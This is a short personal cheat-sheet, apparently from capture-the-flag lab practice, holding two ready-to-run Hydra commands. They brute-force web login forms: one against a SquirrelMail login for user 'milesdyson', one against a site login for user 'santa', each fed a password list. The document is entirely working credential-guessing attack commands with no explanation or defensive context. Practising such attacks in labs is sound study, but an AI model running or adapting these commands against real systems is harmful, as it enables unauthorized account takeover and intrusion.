## hyrdra log in
```
hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -v
```

```
hydra -l santa -P log1.txt 10.10.2.149 http-post-form "/:username=^USER^&password=^PASS^&submit=Login:Invalid username and password" -v
```